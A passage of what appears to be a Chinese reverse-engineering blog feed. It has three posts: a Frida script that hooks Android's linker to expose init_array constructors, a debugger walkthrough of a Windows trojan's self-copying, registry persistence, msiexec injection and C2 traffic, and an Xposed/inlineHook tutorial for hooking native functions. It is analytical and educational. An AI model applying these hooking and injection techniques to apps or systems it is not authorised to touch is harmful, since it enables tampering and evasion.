      asan_name_holder = std::string(kAsanLibDirPrefix) + original_path;
      if (file_exists(asan_name_holder.c_str())) {
        soinfo* si = nullptr;
        if (find_loaded_library_by_realpath(ns, original_path, true, &amp;si)) {
          PRINT("linker_asan dlopen NOT translating \"%s\" -&gt; \"%s\": library already loaded", name,
                asan_name_holder.c_str());
        } else {
          PRINT("linker_asan dlopen translating \"%s\" -&gt; \"%s\"", name, translated_name);
          translated_name = asan_name_holder.c_str();
        }
      }
    }
  }
    // 创建受保护的数据对象，用于在加载库期间保护数据
  ProtectedDataGuard guard;
    // 在命名空间中查找库并加载
  soinfo* si = find_library(ns, translated_name, flags, extinfo, caller);
  loading_trace.End();
    // 如果加载成功，则调用构造函数，并记录加载信息，然后返回句柄
  if (si != nullptr) {
    void* handle = si-&gt;to_handle();
    LD_LOG(kLogDlopen,
           "... dlopen calling constructors: realpath=\"%s\", soname=\"%s\", handle=%p",
           si-&gt;get_realpath(), si-&gt;get_soname(), handle);
      // 调用库的构造函数
    si-&gt;call_constructors();	// &lt;&lt;&lt;&lt;&lt; 跟进看看之后的调用流程
      // 禁用dlopen失败的清理回调
    failure_guard.Disable();
      // 记录加载成功的信息，并返回句柄
    LD_LOG(kLogDlopen,
           "... dlopen successful: realpath=\"%s\", soname=\"%s\", handle=%p",
           si-&gt;get_realpath(), si-&gt;get_soname(), handle);
    return handle;
  }
    // 如果加载失败，则返回nullptr
  return nullptr;
}
</code></pre>
<ul>
<li>这段代码前面做了一堆非空值的判断</li>
<li>然后调用<code>si-&gt;call_constructors()</code>来完成so函数的加载</li>
</ul>
<p>进入<code>si-&gt;call_constructors()</code>后<strong>DT_INIT</strong>以及<strong>DT_INIT_ARRAY</strong>会依次执行</p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240326213902401.png" class="" title="image-20240326213902401">

<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240326214454916.png" class="" title="image-20240326214454916">

<ul>
<li><p>不论<strong>DT_INIT</strong>还是<strong>DT_INIT_ARRAY</strong>都是通过<code>call_function()</code>调用执行</p>
</li>
<li><p>其中的<code>call_array()</code>是模板函数</p>
<blockquote>
<p>这里了解一下共享库初始化函数的执行流程</p>
<ol>
<li><p><code>call_function("DT_INIT", init_func_, get_realpath());</code></p>
<p>这行代码调用了 <code>call_function</code> 函数，传递了三个参数：<code>"DT_INIT"</code>、<code>init_func_</code> 和 <code>get_realpath()</code>。其中：</p>
<ul>
<li><code>"DT_INIT"</code> 是一个字符串，用于标识所调用的初始化函数的类型，这里表示调用的是 <code>DT_INIT</code> 函数。</li>
<li><code>init_func_</code> 是一个函数指针，指向了共享库中的 <code>DT_INIT</code> 函数。</li>
<li><code>get_realpath()</code> 是一个函数，用于获取共享库的路径。</li>
</ul>
<p>在函数内部，它会首先检查 <code>init_func_</code> 是否为空，如果不为空，则调用 <code>function()</code> 函数执行初始化操作，即执行共享库中的 <code>DT_INIT</code> 函数。在执行前后，会通过 <code>TRACE</code> 打印调试信息。</p>
</li>
<li><p><code>call_array("DT_INIT_ARRAY", init_array_, init_array_count_, false, get_realpath());</code></p>
<p>这行代码调用了 <code>call_array</code> 函数，传递了五个参数：<code>"DT_INIT_ARRAY"</code>、<code>init_array_</code>、<code>init_array_count_</code>、<code>false</code> 和 <code>get_realpath()</code>。其中：</p>
<ul>
<li><code>"DT_INIT_ARRAY"</code> 是一个字符串，用于标识所调用的初始化数组的类型，这里表示调用的是 <code>DT_INIT_ARRAY</code> 数组。</li>
<li><code>init_array_</code> 是一个指向初始化数组的指针，该数组包含了一系列的初始化函数。</li>
<li><code>init_array_count_</code> 是初始化数组中元素的数量。</li>
<li><code>false</code> 表示不需要对初始化数组进行反向遍历。</li>
<li><code>get_realpath()</code> 是一个函数，用于获取共享库的路径。</li>
</ul>
<p><code>call_array</code> 函数会遍历 <code>init_array_</code> 数组，依次调用数组中的初始化函数。在每次调用初始化函数前后，同样会通过 <code>TRACE</code> 打印调试信息。</p>
<p>这两行代码的作用是在共享库加载过程中，执行共享库中的初始化函数，以完成一些必要的初始化工作，比如初始化全局变量、注册回调函数等。</p>
</li>
</ol>
</blockquote>
</li>
<li><blockquote>
<p>跟进去可以看到*call_function()*函数它的文件路径是在<code>/bionic/linker/linker_soinfo.cpp</code></p>
<pre><code class="C++">/**
 * @brief 调用链接器构造函数
 * 
 * @param function_name 构造函数的名称
 * @param function 构造函数的函数指针
 * @param realpath 文件的实际路径
 */
static void call_function(const char* function_name __unused,
                          linker_ctor_function_t function,
                          const char* realpath __unused) {
    // 如果构造函数为空指针或者指针的值为 -1，则直接返回，不进行任何操作
    if (function == nullptr || reinterpret_cast&lt;uintptr_t&gt;(function) == static_cast&lt;uintptr_t&gt;(-1)) {
        return;
    }

    // 打印调试信息，包括构造函数的名称、函数指针和文件路径
    TRACE("[ Calling c-tor %s @ %p for '%s' ]", function_name, function, realpath);
    
    // 调用构造函数，传递全局变量 g_argc、g_argv 和 g_envp
    function(g_argc, g_argv, g_envp);
    
    // 再次打印调试信息，表示构造函数调用结束
    TRACE("[ Done calling c-tor %s @ %p for '%s' ]", function_name, function, realpath);
}

/**
 * @brief 调用链接器析构函数
 * 
 * @param function_name 析构函数的名称
 * @param function 析构函数的函数指针
 * @param realpath 文件的实际路径
 */
static void call_function(const char* function_name __unused,
                          linker_dtor_function_t function,
                          const char* realpath __unused) {
    // 如果析构函数为空指针或者指针的值为 -1，则直接返回，不进行任何操作
    if (function == nullptr || reinterpret_cast&lt;uintptr_t&gt;(function) == static_cast&lt;uintptr_t&gt;(-1)) {
        return;
    }

    // 打印调试信息，包括析构函数的名称、函数指针和文件路径
    TRACE("[ Calling d-tor %s @ %p for '%s' ]", function_name, function, realpath);
    
    // 调用析构函数
    function();
    
    // 再次打印调试信息，表示析构函数调用结束
    TRACE("[ Done calling d-tor %s @ %p for '%s' ]", function_name, function, realpath);
}
</code></pre>
<ul>
<li>这两个函数的作用分别是调用链接器构造函数（constructor）和析构函数（destructor）。</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="用Frida获取模块的符号"><a href="#用Frida获取模块的符号" class="headerlink" title="用Frida获取模块的符号"></a>用Frida获取模块的符号</h3><pre><code class="js">function get_addr(){
    var linker_sym = Module.enumerateSymbols("linker")
    console.log("do_dlopen_addr =&gt; ", JSON.stringify(linker_sym))
}
</code></pre>
<ul>
<li><p>linker分为32位和64位两个，32位环境名字是<strong>linker</strong>，64位环境是<strong>linker64</strong></p>
<blockquote>
<p>在脚本打印出的符号中没有看到<code>call_function()</code>，可能是被优化掉了。用IDA确认一下</p>
<ol>
<li><p>用adb命令从手机系统中导出<strong>linker库</strong>文件</p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240404213119392.png" class="" title="image-20240404213119392">
</li>
<li><p>在IDA中检查后没有发现<code>call_function()</code></p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240404213731538.png" class="" title="image-20240404213731538">

<ul>
<li>可以看到分别调用了构造函数<code>call_constructors()</code>、析构函数<code>call_destructors()</code>、<code>call_array()</code></li>
</ul>
</li>
<li><p>跟进去分析之后发现<code>call_function()</code>函数是被优化成代码片段，插入在<code>call_constructors()</code>、<code>call_array()</code>中间了</p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240405221059543.png" class="" title="image-20240405221059543">

<ul>
<li>既然这样的话，根据反编译的伪代码我们可以尝试hook这个<code>_dl_async_safe_format_log()</code>通过这个函数来获取构造函数的名称<code>function_name</code>、函数指针<code>function</code>和文件路径<code>realpath</code></li>
<li>不过需要注意的是，这个函数执行有一个条件是<code>_dl_g_ld_debug_verbosity &gt;= 2</code>，所以在hook这个函数之前先使用frida去这个变量的地址修改它的变量值让<code>_dl_async_safe_format_log()</code>符合执行条件。</li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ul>
<p>通过上面的脚本获取到<strong>linker</strong>的地址之后，根据IDA反编译的结果知道它有5个参数，参照源码参数的类型将结果打印出来，因为函数被优化了所以参数类型跟源码中略有差别，多尝试几次就ok了。</p>
<pre><code class="js">function hook_constructors(linker_sym){
    for(var i = 0; i &lt; linker_sym.length; i++){
        var name = linker_sym[i].name
        if(name.indexOf("__dl_g_ld_debug_verbosity") &gt;= 0){
            var addr__dl_g_ld_debug_verbosity = linker_sym[i].address
            // console.log("addr__dl_g_ld_debug_verbosity =&gt; ", addr__dl_g_ld_debug_verbosity)
            ptr(addr__dl_g_ld_debug_verbosity).writeInt(2)
        }
        if(name.indexOf("__dl_async_safe_format_log") &gt;= 0 &amp;&amp; name.indexOf("va_list") &lt; 0){
            // console.log("__dl_async_safe_format_log", JSON.stringify(linker_sym[i]))
            var addr__dl_async_safe_format_log = linker_sym[i].address
        }
    }
    if(addr__dl_async_safe_format_log){
        Interceptor.attach(addr__dl_async_safe_format_log, {
            onEnter: function(args){
                this.log_level = args[0]
                this.tag = ptr(args[1]).readCString()
                this.fmt = ptr(args[2]).readCString()
                if(this.fmt.indexOf("c-tor") &gt;= 0 &amp;&amp; this.fmt.indexOf("Done") &lt; 0){
                    this.function_type = ptr(args[3]).readCString()
                    this.so_path = ptr(args[5]).readCString()
                    var strs = new Array()	// 创建一个车数组
                    strs = this.so_path.split("/")	// 字符分割
                    this.so_name = strs.pop()
                    this.func_offset = ptr(args[4]).sub(Module.findBaseAddress(this.so_name))
                    console.log("func_type: ", this.function_type,
                    "\nso_name: ", this.so_name,
                    "\nso_path: ", this.so_path,
                    "\nfunc_offset: ", this.func_offset.toString(16))
                }
            }, onLeave: function(retval){}
        })
    }
}
</code></pre>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240410003035124.png" class="" title="image-20240410003035124">

<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240410091216247.png" class="" title="image-20240410091216247">





<h6 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h6><p><a href="https://github.com/xiaoeeyu/link_hook/blob/main/init_arrayAuto.js">hook脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>框架层Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>mm木马分析</title>
    <url>/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="0x00-样本信息"><a href="#0x00-样本信息" class="headerlink" title="0x00 样本信息"></a>0x00 样本信息</h3><ul>
<li><p>文件名称：mm.exe</p>
</li>
<li><p>MD5：37eec1a29d316ed1e5e766b599dc32a1</p>
</li>
<li><p>SHA-1：75f098d6b3f217aba4c068b12896c332216fc6b3</p>
</li>
<li><p>Authentihash：1b17d4d13c65fed36321aec54f2dc9b214308bbc82821659f83e445b93d1962e</p>
</li>
<li><p>Imphash：9e932de2e1e9ccfc4eacc3a16a8c9ab4</p>
</li>
<li><p>文件类型：Win32 EXE</p>
</li>
<li><p>文件大小：63.08 KB</p>
</li>
<li><p>哈勃扫描结果：<a href="https://habo.qq.com/file/showdetail?pk=ADIGYV1qB2IIOls1">https://habo.qq.com/file/showdetail?pk=ADIGYV1qB2IIOls1</a></p>
</li>
</ul>
<h3 id="0x01-主要行为："><a href="#0x01-主要行为：" class="headerlink" title="0x01 主要行为："></a>0x01 主要行为：</h3><ol>
<li><p>劫持系统进程msiexec.exe创建远程线程（将url读入缓冲区修复为一个可以使用的PE文件）</p>
</li>
<li><p>修复改文件夹属性</p>
</li>
<li><p>将自身复制到系统目录下，自删除</p>
</li>
<li><p>设置注册表启动项</p>
</li>
</ol>
<span id="more"></span>

<h3 id="0x02-具体分析"><a href="#0x02-具体分析" class="headerlink" title="0x02 具体分析"></a>0x02 具体分析</h3><ul>
<li>获取自身文件路径<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/2a7657a1-f313-4339-b512-25abeedcfa49.png" class="" title="img"></li>
<li>获取系统时间<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4ca75e30-8c86-4c5b-bd34-cb2f14dc6141.png" class="" title="img"></li>
<li>将自身复制到系统目录下，自删除<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a56aedae-5d39-4f94-aa96-85aea9b4845e.png" class="" title="img"></li>
</ul>
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/69c17b1a-6286-4084-8eba-8972c864a46b.jpg" class="" title="img">

<ul>
<li>进这个函数<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/eb5c6dd9-047e-4051-a943-8ab22e04b67c.png" class="" title="img"></li>
<li>loadlibrary加载msi.dll后动态解密出来一个jmp继续走<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4be8d70e-a2e1-4293-abff-0a7d3cead6b2.png" class="" title="img"></li>
<li>拼接路径名创建文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7f924d59-6b11-42db-89a5-bd28b27c2c11.png" class="" title="img"></li>
<li>读取完关闭文件仅需进这个新创建的局部变量执行，这块其实是要再进行解密的<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/77342a06-06a3-4be1-a320-24a82ceb0909.png" class="" title="img"></li>
<li>循环解密后继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/11a167b0-ed7c-47f2-b1c3-acc3d3e3ef4b.png" class="" title="img"></li>
<li>继续跟进，有些时候并不能确定这些函数都是干什么的，这时候就需要一次一次的试错试出来了，不要害怕尝试<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/42be8870-593a-42b8-ba6d-b83b7d0e3222.png" class="" title="img"></li>
<li>内层有个函数继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/3a9b6fbc-31ec-47f8-a2ef-d3d363126935.png" class="" title="img">
-上面这一块发现是在分区段的修复一个新建的PE文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/1644551f-cd75-454c-8dfc-b71daa2b286f.png" class="" title="img"></li>
<li>继续跟进去<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e910eeb7-d807-45a7-8717-3ddaddcb8c24.png" class="" title="img"></li>
<li>创建文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/29dec3b4-f38f-4110-8154-3472cd46d753.png" class="" title="img"></li>
<li>往这个地址再考一份PE文件，这个地址不固定每次重新打开都会变（总共拷贝了三份PE文件）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e6c03d16-0f6f-460a-a0bd-656833c19116.png" class="" title="img"></li>
<li>继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d2330a96-8bef-454f-8387-937c59e23ca3.png" class="" title="img"></li>
<li>继续跟进（看到可疑的都进去看一下）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/08bdbc7b-b3e2-425e-9877-d0b4162c5e4b.png" class="" title="img"></li>
<li>创建url文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/088ce841-2af5-474a-afff-33533291d0b6.png" class="" title="img"></li>
<li>发现创建了这个系统进程<br><em>重要</em></li>
<li>接下来的操作要注入这个进程，在这里面创建线程执行<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e9328e0f-eb70-47e2-aa78-6f0efb7efbe3.png" class="" title="img"></li>
</ul>
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/c4ba2cbf-d131-48a0-8ff5-79ef23e33bcc.png" class="" title="img">

<ul>
<li>再往下找一下发现有创建远程线程的地方<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/8b729e66-cc45-4a6d-a2d2-5e687462bee3.png" class="" title="img"></li>
<li>另开一个OD附加一下msiexec.exe这个进程<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/173a226d-f97b-40a2-92d3-88e2af7ef0f7.png" class="" title="img"></li>
<li>这里需要修改一下调试设置，接下来调试用（因为接下来createremotethread要在这个进程里面创建新的线程）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/fc2b7683-2209-48a7-a8b1-2226a79e5913.jpg" class="" title="img"></li>
<li>运行到创建远程线程结束<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d9520cf3-5d89-4ce6-adab-79d88e4d588e.png" class="" title="img"></li>
<li>因为我们刚才设置了中断于新线程，所以直接运行（F9）就会断在创建新线程的地方</li>
<li>发现这个地方似曾相识<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/eca5c4da-2678-4e8e-918e-49fa0555ba41.png" class="" title="img"></li>
<li>没错，这个地方循环解密后就是这个函数入口了，和刚才的入口是一样的<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/fc5045d2-e39a-4d8b-808b-25a7144af06d.png" class="" title="img"></li>
<li>继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/8232d7de-931f-4147-97c4-dd8c4a913e6c.png" class="" title="img"></li>
<li>这里同样是在修复各个区段<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/78173e8a-9fa4-4017-9855-d19f4b99bd0d.png" class="" title="img"></li>
<li>上面一个函数出来之后继续跟进下一个<br><strong>发现这里传进去了一个PE文件</strong>进去看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/ac302c10-9626-47d8-849c-3b94eab358f8.png" class="" title="img">
<strong>这里可以用loadPE（以管理员权限打开）从10000000将这整个文件dump出来，用IDA辅助分析</strong></li>
<li>用loadPEdump这样直接从内存中dump出来它的对齐粒度是1000所以要修改一下,改为内存对齐.<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f4843a5b-8ac6-4295-8f01-ac80a9dad61a.jpg" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/6fa79227-ef3d-4542-8feb-b6bc03f30ca0.jpg" class="" title="img"></li>
<li>跟进这里面看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/136657ca-203c-4278-aba7-5d2b7b59a255.png" class="" title="img"></li>
<li>创建目录&gt;拼接路径<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/081776c2-e2a8-426e-bd11-c45a1c4dc4a3.png" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4fcd1911-47dd-4991-9037-d70846fa5471.png" class="" title="img"></li>
<li>设置注册表键值<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f0473f82-6fe3-468a-9281-e1dc3311b417.png" class="" title="img"></li>
<li>打开网络链接<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/54214749-d668-4903-b37d-b537668addf9.png" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b490ece7-6e2f-48bf-abdc-0fc8810214d1.png" class="" title="img">
-跟进函数看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/44343cf0-d018-4672-8dfd-19ed54eae2f3.png" class="" title="img"></li>
<li>这里面有上传和下载的函数但是网站已经废了，我们进去就崩溃了<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f5cdbaf8-2be5-427b-9428-a76e3c41a381.png" class="" title="img"></li>
</ul>
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a1c7b25b-9da8-4888-8490-753e0c90a015.png" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/0353dc7e-2674-42a3-a2a9-c8bd5e7bc90d.png" class="" title="img">

<ul>
<li>我们需要在会崩溃的地方改跳转不去执行<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/cfc90d64-144f-44fa-a50d-808a0c4b5837.png" class="" title="img"></li>
<li>跟了一下发现获取主机名的时候会崩溃（所以就改跳转不去执行了）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d734b48a-841c-4e25-beab-2f6ca8a4b52e.png" class="" title="img"></li>
<li>获取电脑名和用户名<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/c4e6e22c-3dd1-47d1-a9cf-43052e98a2a6.png" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/6f5fd45a-363e-4df5-b1f4-3648d7cf9c2d.png" class="" title="img"></li>
<li>有些地方实在没办法过去就修改eip直接跳过这个函数<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7d9066f5-f2c5-4658-9fa7-6ac4fe329338.png" class="" title="img"></li>
<li>建立连接从网站上读取文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a7724282-bb62-4ef3-9f6d-6e63f457abf8.png" class="" title="img"></li>
<li>给网站发送消息并查看是否返回错误信息<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b698e5c1-6f09-4b47-8407-e471d9b5480c.png" class="" title="img"></li>
<li>检索当前用的磁盘驱动器<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/3d13441a-5579-43f1-8a26-4684d8bf8d80.png" class="" title="img"></li>
<li>获取进程信息<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7748befd-1afa-4b0e-974c-0ddeef1c3ff9.png" class="" title="img"></li>
<li>上传，下载内容<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b54dd262-dda2-456c-bf40-215c38a61bb4.png" class="" title="img"></li>
<li>写文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7351ddef-f311-4373-9b72-7f647430ebf5.png" class="" title="img"></li>
<li>关闭其它进程和线程与服务器断开连接<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/23527c1f-1da8-403d-8a8f-f48344771b2f.png" class="" title="img">
<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/115b22d5-047d-47ad-94a2-56f0a216595a.png" class="" title="img"></li>
</ul>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>windows木马</tag>
      </tags>
  </entry>
  <entry>
    <title>so函数Hook（上）</title>
    <url>/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<h3 id="Xposed插件开发之对so中函数的处理"><a href="#Xposed插件开发之对so中函数的处理" class="headerlink" title="Xposed插件开发之对so中函数的处理"></a>Xposed插件开发之对so中函数的处理</h3><p>对so中函数的hook跟对java层函数的hook不同，Xposed无法完成对so层函数的hook。需要使用其它的框架编写so层的hook代码，然后通过xposed进行主动调用的方式来完成hook。</p>
<p>这里我们先以32位为例，使用<a href="https://github.com/ele7enxxh/Android-Inline-Hook">inlineHook框架</a>，不过这个框架只能hook 32位的app</p>
<p>先来创建一个包含有so库的native C++项目，作为目标app</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231222230559368.png" class="" title="image-20231222230559368">

<ul>
<li><p>这里<code>strstr方法</code>默认返回的是false，如果我们想通过hook让它的返回结果为true，有几个hook点</p>
<blockquote>
<ol>
<li>hook<code>strstr()</code>让其在遇到hookso的时候返回的结果为非空</li>
<li>修改<code>testhook()</code>的参数、或者直接修改返回值</li>
</ol>
</blockquote>
</li>
<li><p>对libC函数的hook要注意一点，hook时机要在目标函数调用前</p>
</li>
</ul>
<h3 id="hook-strstr"><a href="#hook-strstr" class="headerlink" title="hook strstr()"></a>hook <code>strstr()</code></h3><p>对于native-lib.cpp的加载是通过<code>System.loadLibrary()</code>来进行加载的</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231222233205744.png" class="" title="image-20231222233205744">

<ul>
<li>就是说当这个函数返回的时候这个文件生成的so文件就已经加载进入到内存里面了，但是此时还没有执行到<code>stringFromJNI()</code>，自然也就还没有执行到我们写的方法。</li>
<li>那么我们就可以使用Xposed框架首先完成对<code>System.loadLibrary()</code>的hook，然后再写一个so文件对目标so进行hook</li>
<li>在我们hook到<code>System.loadLibrary()</code>函数执行，但是目标函数还没有执行到的时候加载我们的so文件对目标so中的函数进行hook</li>
</ul>
<h4 id="hookSystem-loadLibrary-，加载so"><a href="#hookSystem-loadLibrary-，加载so" class="headerlink" title="hookSystem.loadLibrary()，加载so"></a>hook<code>System.loadLibrary()</code>，加载so</h4><p>这个脚本大体上跟之前差不多</p>
<pre><code class="java">public class XposedHookSo implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable{
        Log.i("XposedHookSo", loadPackageParam.packageName);
        XposedBridge.log("XposedHookSo-&gt;app packagename" + loadPackageParam.packageName);
        if (loadPackageParam.packageName.equals("com.xiaoeryu.xposedhookso")){
            XposedBridge.log("XposedHookSo" + loadPackageParam.packageName);
            XposedHelpers.findAndHookMethod("java.lang.Runtime", loadPackageParam.classLoader, "loadLibrary0", ClassLoader.class, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    String soname =  (String) param.args[1];
                    XposedBridge.log("beforeHookedMethod Runtime.loadLibrary0(" + soname + "," + param.args[0] + ")");
                }
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    String soname =  (String) param.args[1];
                    XposedBridge.log("afterHookedMethod Runtime.loadLibrary0("+soname+")");

                    // 在loadLibrary0执行完成后，主动调用我们的so文件
                    if (soname.contains("native-lib")){
//                        System.loadLibrary("native-lib");
                        System.load("/data/data/com.xiaoeryu.xposedhookso/files/hookso.so");
                    }
                }
            });
        }
    }
}
</code></pre>
<ul>
<li><p>通过xposedhook<code>loadLibrary0</code>监测到目标so被加载进内存之后，就主动调用我们的hookso</p>
</li>
<li><blockquote>
<p>loadLibrary函数在6.1之后的版本中变为了loadLibrary0，参数顺序也有变化</p>
<pre><code class="java">6.0.1
public static void loadLibrary(String libName) {
    Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader());
}

8.1
public static void loadLibrary(String libname) {
    Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);
}
</code></pre>
</blockquote>
</li>
</ul>
<h4 id="编写so-hook插件"><a href="#编写so-hook插件" class="headerlink" title="编写so hook插件"></a>编写so hook插件</h4><p>将框架的源码下载下来解压，把源码拷贝到cpp项目的cpp目录下方便调用</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224232245959.png" class="" title="image-20231224232245959">

<p>修改CMakeLists.txt文件，把要使用的文件添加进去</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224232314783.png" class="" title="image-20231224232314783">

<p>接下来我们需要编写so层的hook代码</p>
<p>可以按照框架给的示例来稍微修改一下就可以了</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224222500261.png" class="" title="image-20231224222500261">

<ul>
<li>这里先创建一个指针来保存原来的函数，然后再创建一个指针来保存替换的函数，可以在替换函数中调用原函数的指针</li>
</ul>
<h6 id="创建一个新的native-C-项目在native-lib-cpp中写入hookstrstr方法的代码"><a href="#创建一个新的native-C-项目在native-lib-cpp中写入hookstrstr方法的代码" class="headerlink" title="创建一个新的native C++项目在native-lib.cpp中写入hookstrstr方法的代码"></a>创建一个新的native C++项目在<strong>native-lib.cpp</strong>中写入hook<code>strstr方法</code>的代码</h6><img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224233047669.png" class="" title="image-20231224233047669">

<p>写完之后调试一下看看是否能拿到目标函数地址</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240113205254601.png" class="" title="image-20240113205254601">

<ul>
<li>可以看到成功的拿到了so的地址和目标函数的地址</li>
</ul>
<p>运行让它跑起来</p>
